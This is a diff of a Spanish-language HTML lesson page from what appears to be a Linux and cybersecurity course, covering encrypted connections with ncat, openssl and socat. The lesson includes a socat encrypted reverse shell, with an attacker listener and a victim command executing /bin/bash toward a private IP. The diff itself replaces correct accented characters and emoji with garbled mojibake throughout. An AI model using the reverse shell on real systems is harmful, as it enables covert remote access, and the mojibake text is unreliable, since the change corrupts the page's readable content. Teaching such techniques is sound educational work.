@@ -1,9 +1,9 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>43. Uso de conexiones encriptadas | Introducción a Linux</title>
+    <title>43. Uso de conexiones encriptadas | IntroducciÃ³n a Linux</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="../../css/styles.css" />
     <style>
@@ -134,35 +134,35 @@
   </head>
   <body>
     <nav>
-      <a href="../../introduccion-a-linux.html" class="nav-logo">hack<span>4u</span></a>
+      <a href="../../index.html" class="nav-logo">hack<span>4u</span></a>
       <ul class="nav-links">
-        <li><a href="../../introduccion-a-linux.html">Cursos</a></li>
+        <li><a href="../../index.html">Cursos</a></li>
         <li><a href="#">Roadmap</a></li>
-        <li><a href="#">Conócenos</a></li>
+        <li><a href="#">ConÃ³cenos</a></li>
       </ul>
       <div class="nav-cta">
-        <button class="btn-ghost">Iniciar sesión</button>
+        <button class="btn-ghost">Iniciar sesiÃ³n</button>
         <button class="btn-accent">Registrarse</button>
       </div>
     </nav>
     <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
       <div class="breadcrumb">
-        <a href="../../introduccion-a-linux.html">Inicio</a><span>›</span>
-        <a href="../../introduccion-a-linux.html">Cursos</a><span>›</span>
-        <a href="../../introduccion-a-linux.html">Introducción a Linux</a><span>›</span>
+        <a href="../../index.html">Inicio</a><span>â€º</span>
+        <a href="../../index.html">Cursos</a><span>â€º</span>
+        <a href="../../index.html">IntroducciÃ³n a Linux</a><span>â€º</span>
         <span style="color: var(--text-2);">Clase 43</span>
       </div>
     </div>
     <div class="lesson-content">
-      <a href="../../introduccion-a-linux.html" class="back-link">← Volver al curso</a>
-      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
+      <a href="../../index.html" class="back-link">â† Volver al curso</a>
+      <span class="course-tag">ðŸ§ Linux Â· Ciberseguridad</span>
       <h1 class="course-title" style="margin-bottom: 0.5rem;">Uso de conexiones encriptadas</h1>
-      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 2:55 · Sección 2: Temario</div>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">DuraciÃ³n: 2:55 Â· SecciÃ³n 2: Temario</div>
 
-      <p>Las conexiones con netcat tradicional van en texto plano. Cualquiera en la red intermedia puede capturar el tráfico con <code>tcpdump</code> o <code>Wireshark</code> y leer los datos. Para evitarlo, necesitamos cifrar la comunicación.</p>
+      <p>Las conexiones con netcat tradicional van en texto plano. Cualquiera en la red intermedia puede capturar el trÃ¡fico con <code>tcpdump</code> o <code>Wireshark</code> y leer los datos. Para evitarlo, necesitamos cifrar la comunicaciÃ³n.</p>
 
       <h2>ncat: Netcat con SSL</h2>
-      <p><code>ncat</code> es la versión moderna incluida con Nmap. Soporta cifrado SSL/TLS nativo, a diferencia del netcat tradicional.</p>
+      <p><code>ncat</code> es la versiÃ³n moderna incluida con Nmap. Soporta cifrado SSL/TLS nativo, a diferencia del netcat tradicional.</p>
 
       <pre><code># Servidor con SSL (genera certificado temporal)
 ncat --ssl -lvnp 4444
@@ -174,7 +174,7 @@ ncat --ssl -nv 192.168.1.100 4444
 ncat --ssl --ssl-cert server.crt --ssl-key server.key -lvnp 4444</code></pre>
 
       <div class="highlight">
-        <strong>🔒 Diferencia clave:</strong> <code>nc</code> tradicional no cifra. <code>ncat --ssl</code> añade una capa TLS completa. Para instalarlo en Ubuntu: <code>sudo apt install ncat</code>. Viene incluido con <code>nmap</code>.
+        <strong>ðŸ”’ Diferencia clave:</strong> <code>nc</code> tradicional no cifra. <code>ncat --ssl</code> aÃ±ade una capa TLS completa. Para instalarlo en Ubuntu: <code>sudo apt install ncat</code>. Viene incluido con <code>nmap</code>.
       </div>
 
       <h2>OpenSSL s_client como cliente</h2>
@@ -187,7 +187,7 @@ openssl s_client -connect google.com:443
 openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
 openssl s_server -key key.pem -cert cert.pem -accept 4444
 
-# Cliente conectándose
+# Cliente conectÃ¡ndose
 openssl s_client -connect 192.168.1.100:4444</code></pre>
 
       <h2>Socat: El todoterreno</h2>
@@ -203,27 +203,27 @@ socat OPENSSL-CONNECT:192.168.1.100:4444,verify=0 FILE:enviar.zip
 # Reverse shell cifrada con socat
 # Atacante:
 socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork STDOUT
-# Víctima:
+# VÃ­ctima:
 socat OPENSSL-CONNECT:192.168.1.100:4444,verify=0 EXEC:/bin/bash</code></pre>
 
       <div class="warning">
-        <strong>⚠️ Diferencia crítica:</strong> Conexión <strong>raw</strong> (nc) vs <strong>cifrada</strong> (ncat --ssl, socat OPENSSL). Con raw, cualquier persona con acceso a la red puede ver el tráfico con <code>tcpdump</code>. Con cifrado, aunque capturen los paquetes, no podrán leer el contenido sin la clave.
+        <strong>âš ï¸ Diferencia crÃ­tica:</strong> ConexiÃ³n <strong>raw</strong> (nc) vs <strong>cifrada</strong> (ncat --ssl, socat OPENSSL). Con raw, cualquier persona con acceso a la red puede ver el trÃ¡fico con <code>tcpdump</code>. Con cifrado, aunque capturen los paquetes, no podrÃ¡n leer el contenido sin la clave.
       </div>
 
       <div class="lesson-nav">
-        <a href="clase-42.html">← Anterior: Uso de netcat para realizar conexiones</a>
-        <a href="clase-44.html">Siguiente: Creando nuestros propios escáneres en Bash →</a>
+        <a href="clase-42.html">â† Anterior: Uso de netcat para realizar conexiones</a>
+        <a href="clase-44.html">Siguiente: Creando nuestros propios escÃ¡neres en Bash â†’</a>
       </div>
     </div>
     <footer>
       <div class="footer-logo">hack4u</div>
       <div class="footer-links">
         <a href="#">Aviso Legal</a>
-        <a href="#">Política de Cookies</a>
+        <a href="#">PolÃ­tica de Cookies</a>
         <a href="#">Privacidad</a>
-        <a href="#">Términos y Condiciones</a>
+        <a href="#">TÃ©rminos y Condiciones</a>
       </div>
-      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
+      <div>Â© 2026 hack4u.io â€” Todos los derechos reservados.</div>
     </footer>
   </body>
 </html>
